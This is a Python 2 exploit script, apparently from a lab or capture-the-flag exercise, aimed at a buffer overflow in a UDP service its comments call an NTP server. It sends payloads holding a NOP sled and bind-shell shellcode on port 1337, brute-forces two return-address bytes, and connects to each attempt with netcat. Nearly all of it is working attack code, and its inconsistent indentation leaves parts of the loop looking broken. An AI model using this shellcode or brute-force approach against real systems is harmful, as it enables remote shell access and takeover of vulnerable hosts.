#!/usr/bin/python
import sys
from binascii import unhexlify
import socket
from subprocess import call


target_ip = '192.168.178.10'  #NTP server IP 
port = 1234                   #NTP server port
null_terminator = '\x00'      # null terminator will be used in the shellcode
nops = '\x90' * 46            # No operations for the shellcode
bind_shell_code = '\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80'

acceptable_ebp = '\xf8\xa4\x87\xbf'
last_2B_in_RT = '\x04\x08'          # last two bytes are fixed bytes
client_sock =   socket.socket(socket.AF_INET,socket.SOCK_DGRAM)



for y in range(0,256):
    rand_byte2 = ''
    byte_2 = format(y, '#04x')[2:]      # formating the second byte and adding 0x to it with the unhexlify function
    byte_2 = unhexlify(byte_2)
    for x in range(0,256):
        rand_byte1 = ''                 
	payload = ''	
	if x % 16 == 0:
	    continue 
	byte_1 = format(x, '#04x')[2:]
	if not byte_1[-1] == '1':
	    continue 
	byte_1 = unhexlify(byte_1)    # formating the fisrt byte and adding 0x to it.
        rand_byte1 += byte_1
        rand_byte2 += byte_2
	payload += null_terminator + nops + bind_shell_code + acceptable_ebp + byte_1 + byte_2 + last_2B_in_RT
	client_sock.sendto(payload, (target_ip,port))       # sending payload to target
        
	for a, b in zip(bytearray(rand_byte2), bytearray(rand_byte1)):
            print('[+] Trying : 0x%02x%02x' % (a, b))                   # printing bytes while brute forcing.. 
                call(['netcat', '-n', '192.168.178.10', '1337'])        # connecting with netcat since the shellcode above use 1337 as bind port
                print "[-] Not Working"                                 # If not working print not working..
                print '\n'

#======================================================================================
# After Successfully Exploiting the Code, I realized that the Return Address is = 9F01
#======================================================================================







